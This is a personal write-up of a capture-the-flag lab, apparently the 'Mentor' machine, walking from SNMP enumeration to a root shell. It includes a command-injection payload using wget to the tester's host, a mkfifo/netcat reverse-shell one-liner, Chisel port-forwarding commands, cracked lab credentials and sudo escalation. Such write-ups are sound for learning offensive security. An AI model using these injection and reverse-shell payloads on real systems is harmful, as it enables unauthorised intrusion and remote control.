Main steps
1. Fuzz VHOSTs to find subdomain
2. UDP scan to find open `SNMP` port
3. Brute force `SNMP` community string to find credentials
4. Fuzz subdomain's directories to find request format
5. Send request with credential to gain JWT session token
6. Use token to enumerate `admin` subdomains
7. Command injection through POST request to `admin` subdomain
8. Gain shell access through command injection
9. Enumerate app files for database credentials
10. Port forward to access database to read user credentials
11. Gain SSH access with user credentials
12. Enumerate `SNMP` config files for user credentials
13. Lateral movement with user credentials
14. Enumerate `sudo -l` for privilege escalation

Learning points
1. When using `ffuf`, try different filters - add `-mc all` before filtering (refer to 1 liners)
2. So `onesixtyone` doesn't fking work don't use it use `SNMPBrute.py` instead
3. If stuck on what config files to check, start with whatever services are running (`SNMP` in this case)
4. `PostGreSQL` credential format: if you see something like `postgresql://postgres:postgres@172.22.0.1/mentorquotes_db`, that is the `username:password@db_IP/db_Name`
5. That entire web app enumeration was so ass

`nmap`
![[Pasted image 20260310025817.png]]

ports 22, 80 open

Static webpage with no links
`Wappalyzer` shows that its running on a `Flask` 2.0.3 server.
`Feroxbuster` returned nothing interesting.
`ffuf` returned no subdomains.

Looking at the response headers, the server version is shown as `Werkzeug 2.0.3` and `Python 3.6.9`, but nothing major comes up when searching the versions.
![[Pasted image 20260310030537.png]]

Ran a UDP scan and found that UDP port 161 `SNMP` was open.
Ran `SNMPWalk` to check the MIB.
![[Pasted image 20260310032947.png]]

So for some reason my `ffuf` command earlier did not work as intended, but running it with `-mc 200, 404` instead results in the `api.mentorquotes.htb` subdomain being discovered.
![[Pasted image 20260310034720.png]]

Ran `Feroxbuster` on the new subdomain and found a few directories, most notably the `/openapi.json` and `/docs` directories, with a version number of 3.0.2 for `openapi`.

So `onesixtyone` does not work properly or something? Running `SNMPBrute` against the server shows that `internal` is another community string for `SNMP`.
![[Pasted image 20260310035944.png]]

`SNMPWalk` takes a long time to output all the information, so `SNMPBulkWalk` can be used instead as it's a lot faster. Eventually once all the information is out, enumerating it shows that there is a `login.py` script being run that has what looks like a password as a parameter.
![[Pasted image 20260310041019.png]]

` kj23sadkj123as0-d213 `

Tried to send a request to the `/auth/login` as user `james`. The `Swagger` UI shows the exact `curl` command to send the request with.
```
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}'

```

This results in a long string being returned.
![[Pasted image 20260310041236.png]]

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

Could be an encrypted string of some sort, or maybe a session cookie since we're logged in as `james`. Looked it up online and it seems like it is a JWT token.
![[Pasted image 20260310043437.png]]

JWT tokens are supposed to be passed to the website using the `Autorization: Bearer <token>` header. However, looking at the code in `Swagger` UI, it seems this application does not need the `Bearer` word in the header.
![[Pasted image 20260310043627.png]]

Going back to the `Feroxbuster` results, there was a `/admin` directory that was inaccessible previously, and a `/admin/backup` and `/admin/check` directory.

GET request to `/admin/check` shows a message `Not implemented yet!`
![[Pasted image 20260310043803.png]]

Tried sending a GET request with the `Authorization` header and the token and got this result.
![[Pasted image 20260310043826.png]]

`Method Not Allowed` seems to suggest that GET will not work, so I tried POSTing instead.
![[Pasted image 20260310043902.png]]

The response suggests that a body is required. Added a body to the request and tried again.
![[Pasted image 20260310043933.png]]

Now it's saying something about the "path" in the body, so I added a "path" item into the JSON.
![[Pasted image 20260310044020.png]]

The site returns `"INFO":"Done!"` and nothing else. 

Making an educated guess, the API is taking some kind of file path and using that to make a backup. This means that it may be taking the path variable from the POST request and appending it to some kind of command in the server.

I tested this by adding this to the path: `"path":"test;wget http://10.10.14.77/linpeas.sh"` to check if the server makes any request to my HTTP server.

Checking my HTTP server's logs shows that it did make a request - to GET `/linpeas.sh/app_backkup.tar`. From this, I can confirm that command injection is possible through this POST request.
![[Pasted image 20260310044339.png]]

Tried sending a few reverse shell payloads and was able to get a reverse shell with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.77 4444 >/tmp/f`.
![[Pasted image 20260310044743.png]]

Looks like I am inside of a Docker container here.

The user flag is in the home directory here.

Checking the app folder, `db.py` contains `PostgreSQL` database credentials
![[Pasted image 20260310050153.png]]

However there does not seem to be a `psql` client on this machine.
Port forwarded with `Chisel` with `./chisel_1.8.1_linux_amd64 client 10.10.14.77:5555 R:5432:172.22.0.1:5432` on the client and `./chisel_1.8.1_linux_amd64 server --port 5555 --reverse` on the server, then accessed the `PostGreSQL` database with `psql -h 127.0.0.1 -p 5432 -U postgres`.
![[Pasted image 20260310050712.png]]

Found an MD5 hashed password for user `svc` in the database.
![[Pasted image 20260310050841.png]]

`svc` : ` 53f22d0dfa10dce7e29cd31f4f953fd8 `

Ran it through Crackstation and cracked the hash
![[Pasted image 20260310050920.png]]

`svc` :  ` 123meunomeeivani `

The other password hash for `james` was not able to be cracked (both crackstation and hashcat)

Was able to get SSH access to `svc` using this password.
![[Pasted image 20260310051046.png]]

Looking through config files now.
Since `SNMP` is running on this machine, checked the `SNMP` config files at `/etc/snmp/snmp.conf` and `/etc/snmp/snmpd.conf`. The first file has nothing interesting but the second one had what looks like a password at the bottom.
![[Pasted image 20260310051612.png]]

Tried using this password to `su` as `james` and was able to get access.
![[Pasted image 20260310051639.png]]

`james` : ` SuperSecurePassword123__ `

Enumerating `sudo -l` shows that `james` may run `/bin/sh` as `sudo`.
![[Pasted image 20260310051818.png]]

Ran `sh` with `sudo` and launched a root shell.
![[Pasted image 20260310051857.png]]